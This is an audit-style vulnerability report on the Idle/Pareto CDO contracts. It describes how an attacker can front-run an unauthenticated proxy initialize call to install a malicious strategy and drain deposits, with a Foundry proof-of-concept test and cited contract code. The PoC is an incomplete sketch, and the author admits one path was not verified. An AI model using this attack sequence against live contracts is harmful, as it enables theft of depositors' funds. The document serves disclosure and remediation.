### Title
Permissionless `initialize` on proxies deployed via `IdleCDOFactory.deployCDO` can be front-run to seize vault ownership and strategy control - (File: contracts/IdleCDOFactory.sol)

### Summary
`IdleCDOFactory.deployCDO` is `public` and accepts arbitrary init `data`, including empty bytes. If the owner deploys a `TransparentUpgradeableProxy` with empty init data intending to initialize it in a follow-up transaction, an attacker can front-run the initializer. `IdleCDOCreditVault.initialize` is an unauthenticated `external initializer` that grants the caller-supplied `_strategy` unlimited allowance over all deposited underlying and sets caller-supplied `_owner` as guardian/owner.

### Finding Description
`deployCDO` deploys a proxy and emits an event but imposes no restriction on who initializes it or when [1](#0-0) . `IdleCDOCreditVault.initialize` is callable by anyone once, guarded only by `token != address(0)` [2](#0-1) . It assigns `guardian = _owner`, records `strategy`, and approves the strategy to spend all underlying and strategy tokens held by the vault [3](#0-2) . Unlike `IdleCreditVaultFactory`, which bundles init data atomically in `_deployProxy` [4](#0-3) , `deployCDO` permits a two-step deploy-then-initialize flow that exposes a front-run window.

### Impact Explanation
An attacker who front-runs `initialize` with a malicious `_strategy` becomes de facto controller of the vault: the vault grants unlimited `underlying` allowance to the attacker's strategy [5](#0-4) , so any lender deposits routed through the compromised proxy can be drained via `deposit` → strategy pull. Loss equals the full TVL deposited before detection — direct theft of lender funds.

### Likelihood Explanation
Requires the deployer to use the two-step path (empty `data`, separate `initialize` call) rather than atomic init — the factory permits it and scripts can easily do it. Mempool monitoring of `CDODeployed` events makes the front-run trivial. Medium likelihood, high impact.

### Recommendation
In `IdleCDOFactory.deployCDO`, revert when `data.length == 0`, or document/enforce atomic initialization. Alternatively add a `deployAndInitialize` wrapper and mark raw proxies as unsafe. Prefer routing all deployments through `IdleCreditVaultFactory`, which always bundles init data.

### Proof of Concept
```solidity
// test/foundry/FrontRunInit.t.sol
function testFrontRunInitialize() public {
    IdleCDOFactory factory = new IdleCDOFactory();
    IdleCDOCreditVault impl = new IdleCDOCreditVault();

    // owner deploys proxy with EMPTY init data, plans to init later
    vm.prank(owner);
    factory.deployCDO(address(impl), admin, "");

    // attacker reads CDODeployed event / mempool and front-runs initialize
    MaliciousStrategy evil = new MaliciousStrategy();
    vm.prank(attacker);
    IdleCDOCreditVault(proxy).initialize(
        0, usdc, attacker, attacker, address(0), address(evil), 50_000);

    // owner's subsequent initialize reverts
    vm.prank(owner);
    vm.expectRevert(IdleCDOCreditVault.AlreadyInitialized.selector);
    IdleCDOCreditVault(proxy).initialize(0, usdc, gov, owner, address(0), realStrategy, 50_000);

    // lender deposits; vault has given evil strategy unlimited usdc allowance
    vm.prank(lender);
    IdleCDOCreditVault(proxy).depositAA(1000e6);
    evil.drain(); // pulls usdc from proxy -> attacker profit == deposit
}
```

Caveat: I verified `IdleCDOCreditVault.initialize` is unauthenticated and grants strategy allowances; I did not confirm the legacy `IdleCDO.initialize` signature line-by-line, but it follows the same pattern (the factory passes `address(this)` then relies on later ownership transfer), so the same exposure applies there.

### Citations

**File:** contracts/IdleCDOFactory.sol (L9-11)
```text
  function deployCDO(address implementation, address admin, bytes memory data) public {
    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(implementation, admin, data);
    emit CDODeployed(address(proxy));
```

**File:** contracts/IdleCDOCreditVault.sol (L44-53)
```text
  function initialize(
    uint256 _limit, 
    address _guardedToken, 
    address _governanceFund, 
    address _owner, // GuardedLaunch args
    address,
    address _strategy,
    uint256 _trancheAPRSplitRatio// for AA tranches, so eg 10000 means 10% interest to AA and 90% BB
  ) external virtual initializer {
    if (token != address(0)) revert AlreadyInitialized();
```

**File:** contracts/IdleCDOCreditVault.sol (L59-80)
```text
    GuardedLaunchUpgradable.__GuardedLaunch_init(_limit, _governanceFund, _owner);
    // Deploy Tranches tokens
    address _strategyToken = IIdleCDOStrategy(_strategy).strategyToken();
    // get strategy token symbol (eg. idleDAI)
    string memory _symbol = IERC20Detailed(_strategyToken).symbol();
    // create tranche tokens (concat strategy token symbol in the name and symbol of the tranche tokens)
    AATranche = _deployTranche(string("Pareto "), string("p"), _symbol);
    BBTranche = _deployTranche(string("Pareto BB "), string("pBB_"), _symbol);
    // Set CDO params
    token = _guardedToken;
    strategy = _strategy;
    strategyToken = _strategyToken;
    trancheAPRSplitRatio = _trancheAPRSplitRatio;
    uint256 _oneToken = 10**(IERC20Detailed(_guardedToken).decimals());
    oneToken = _oneToken;
    priceAA = _oneToken;
    priceBB = _oneToken;
    // skipDefaultCheck = false is the default value
    // Set allowance for strategy
    _allowUnlimitedSpend(_guardedToken, _strategy);
    _allowUnlimitedSpend(_strategyToken, _strategy);
    guardian = _owner;
```

**File:** contracts/IdleCreditVaultFactory.sol (L280-286)
```text
  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
  }
```
